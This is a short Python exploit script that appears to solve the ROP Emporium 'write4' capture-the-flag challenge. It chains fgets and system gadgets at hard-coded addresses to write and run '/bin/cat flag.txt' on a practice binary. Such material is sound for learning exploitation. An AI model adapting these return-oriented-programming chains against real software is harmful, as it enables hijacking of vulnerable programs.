#!/usr/bin/python

import sys
import pwn
import time

import util

def main():
    data_section = 0x00601040
    rbp = data_section + 0x20
    fgets = 0x004007ec

    pop_rdi = 0x00400893
    system = 0x00400810

    addrs1 = [
        rbp, # set up argument for fgets
        fgets, # jump to fgets
    ]
    chain1 = util.chain(addrs1, 32)
    inp = '/bin/cat flag.txt\0'

    addrs2 = [
        pop_rdi, # prepare argument for system
        data_section, # value to put in rdi
        system, # jump to system call
    ]
    chain2 = inp + '\0' * (0x28 - len(inp)) + util.chain(addrs2, 0)

    with open("write4.in", "wb") as f:
        f.write("{}\n{}\n".format(chain1, chain2))

    print chain1
    print chain2
    #proc = pwn.process('./write4')
    #proc.sendline(chain)
    #proc.sendline(inp)
    #print proc.recvall()

if __name__ == '__main__':
    main()
